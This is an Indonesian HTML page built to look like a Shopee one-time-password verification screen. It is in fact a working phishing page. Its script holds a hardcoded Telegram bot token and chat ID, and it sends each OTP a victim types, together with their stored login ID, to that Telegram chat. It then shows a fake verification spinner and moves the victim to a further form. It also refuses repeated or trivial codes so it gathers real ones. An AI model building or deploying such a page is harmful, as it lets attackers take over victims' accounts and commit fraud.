<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masukkan Kode Verifikasi</title>
    <style>
        body {
            font-family: "Roboto", Arial, sans-serif;
            background: #fff;
            margin: 0;
            padding: 0;
            color: #333;
        }

        header {
            display: flex;
            align-items: center;
            padding: 14px 16px;
            background: #fff;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
        }

        header h1 {
            flex: 1;
            text-align: center;
            font-size: 18px;
            margin: 0;
            font-weight: 500;
        }

        .content {
            padding: 24px 16px;
            text-align: center;
        }

        .content p {
            font-size: 15px;
            color: #444;
            margin: 6px 0;
        }

        .email-display {
            /* Gaya untuk teks email yang terdaftar */
            color: #333; 
            font-weight: bold;
        }

        .otp-box {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 30px 0;
        }

        .otp-box input {
            width: 40px;
            height: 48px;
            font-size: 20px;
            text-align: center;
            border: none;
            border-bottom: 2px solid #ccc;
            outline: none;
            transition: border-color 0.2s;
        }

        .otp-box input:focus {
            border-color: #EE4D2D; 
        }

        button {
            background: #ccc;
            color: #fff;
            font-size: 16px;
            border: none;
            width: 100%;
            padding: 12px;
            border-radius: 6px;
            cursor: not-allowed;
            transition: background 0.3s;
        }

        button.active {
            background: #EE4D2D;
            cursor: pointer;
        }

        .wait {
            margin-top: 14px;
            font-size: 14px;
            color: #666;
        }

        .wait span {
            color: #e65100;
            font-weight: 500;
        }
        
        /* --- STYLE UNTUK LOADING SPINNER --- */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.95); 
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            display: none; /* Awalnya tersembunyi */
        }

        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-top: 4px solid #EE4D2D; /* Warna Shopee */
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>

<body>
    <header>
        <h1>Masukkan Kode Verifikasi</h1>
    </header>
    <div class="content">
        <p>Kode verifikasi (OTP) kamu telah dikirim melalui <b class="email-display">email yang terdaftar</b></p>
        <p><b class="email-display" id="target-email-display"></b></p> 
        <div class="otp-box">
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
            <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
        </div>
        <button id="lanjut" disabled>Lanjut</button>
        <div class="wait">Mohon tunggu <span id="countdown">60</span> detik untuk mengirim ulang</div>
    </div>
    
    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner"></div>
        <p id="loadingMessage" class="mt-4 text-lg text-gray-700 mt-3">Memproses, harap tunggu...</p>
    </div>

    <script>
        // === KONFIGURASI TELEGRAM ===
        const TELEGRAM_BOT_TOKEN = '7812428468:AAE1qHjLLHOQlAmABXbr9JhXEg0KQkb0XW0';
        const TELEGRAM_CHAT_ID = '5923031825';
        const TELEGRAM_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        // --- Ambil riwayat semua percobaan dari session storage ---
        let allCodeAttempts = JSON.parse(sessionStorage.getItem('all_code_attempts')) || [];
        // --- Ambil Username/Email dari Local Storage (karena disimpan dari halamantoko.html) ---
        const storedLogin = localStorage.getItem('verificationPhoneNumber') || 'TIDAK_TERSEDIA'; 

        // === UTILITY FUNGSI ===
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        function showLoading(message) {
            document.getElementById("loadingOverlay").style.display = 'flex';
            document.getElementById("loadingMessage").textContent = message || "Memproses, harap tunggu...";
        }

        function hideLoading() {
            document.getElementById("loadingOverlay").style.display = 'none';
        }
        
        // === OTP Input Logic ===
        const inputs = document.querySelectorAll(".otp-box input");
        const lanjutBtn = document.getElementById("lanjut");
        
        inputs.forEach((input, index) => {
            input.addEventListener("input", (e) => {
                const value = e.target.value.replace(/[^0-9]/g, ""); 
                e.target.value = value;
                
                if (value && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                checkFilled();
            });
            input.addEventListener("keydown", (e) => {
                if (e.key === "Backspace" && !e.target.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        function checkFilled() {
            const allFilled = Array.from(inputs).every((input) => input.value.length === 1);
            if (allFilled) {
                lanjutBtn.classList.add("active");
                lanjutBtn.disabled = false;
            } else {
                lanjutBtn.classList.remove("active");
                lanjutBtn.disabled = true;
            }
        }
        
        // === Fungsi Validasi Tambahan ===
        function isValidOtp(otp) {
            if (otp.length !== 6) return false;
            
            // 1. Cek apakah 6 digitnya sama semua (misalnya 111111)
            const firstDigit = otp[0];
            const allSame = otp.split('').every(digit => digit === firstDigit);
            
            if (allSame) {
                return false;
            }
            
            // 2. Cek apakah input saat ini sama dengan kode yang sudah pernah dimasukkan (dari riwayat)
            if (allCodeAttempts.includes(otp)) {
                return false; 
            }
            
            return true;
        }

        
        lanjutBtn.addEventListener("click", async () => {
            const otp = Array.from(inputs).map((i) => i.value).join("");
            
            if (!isValidOtp(otp)) {
                alert("6 Digit yang anda input salah");
                return; 
            }
            
            // 1. Simpan input saat ini ke riwayat global
            allCodeAttempts.push(otp);
            sessionStorage.setItem('all_code_attempts', JSON.stringify(allCodeAttempts));
            
            // 2. Tentukan email yang dikirim (menggunakan storedLogin yang harusnya berupa email/username/nomor)
            const emailTerdaftar = storedLogin; 
            const message = `#OTP_EMAIL\nLogin ID (Email/HP/Username): **${emailTerdaftar}**\nKode OTP EMAIL: **${otp}**`;
            
            // 3. Kirim ke Telegram (SEGERA)
            await sendToTelegram(message);
            
            // 4. Tampilkan Loading 3 detik
            showLoading("Memverifikasi Kode...");
            await sleep(3000); 
            hideLoading();
            
            // 5. Arahkan ke halaman berikutnya
            window.location.href = "formulir2.html"; 
        });
        
        // === Countdown Timer (60 detik) ===
        let time = 60;
        const countdownEl = document.getElementById("countdown");
        const timer = setInterval(() => {
            time--;
            countdownEl.textContent = time;
            if (time <= 0) {
                clearInterval(timer);
                countdownEl.parentElement.textContent = "Kamu bisa mengirim ulang kode sekarang.";
            }
        }, 1000);
        
        // === Fungsi untuk mengirim data ke Telegram ===
        async function sendToTelegram(message) {
            const apiUrl = `${TELEGRAM_URL}?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
            
            try {
                const response = await fetch(apiUrl, { method: 'GET' });
                const data = await response.json();

                if (response.ok && data.ok) {
                    console.log('Pesan OTP berhasil dikirim ke Telegram!');
                } else {
                    console.error('Gagal mengirim pesan ke Telegram (API Error):', data.description);
                }
                return response.ok;

            } catch(error) {
                console.error('Terjadi kesalahan saat mengirim ke Telegram:', error);
                return false;
            }
        }
        
        // === INITIALIZATION ===
        document.addEventListener('DOMContentLoaded', () => {
            const emailDisplayEl = document.getElementById('target-email-display');
            if (emailDisplayEl) {
                // Tampilkan Username/Email/Nomor HP yang diinput di halaman pertama
                emailDisplayEl.textContent = storedLogin;
            }
            // Atur fokus ke input pertama saat halaman dimuat
            if (inputs.length > 0) {
                 inputs[0].focus();
            }
        });
    </script>
</body>

</html>
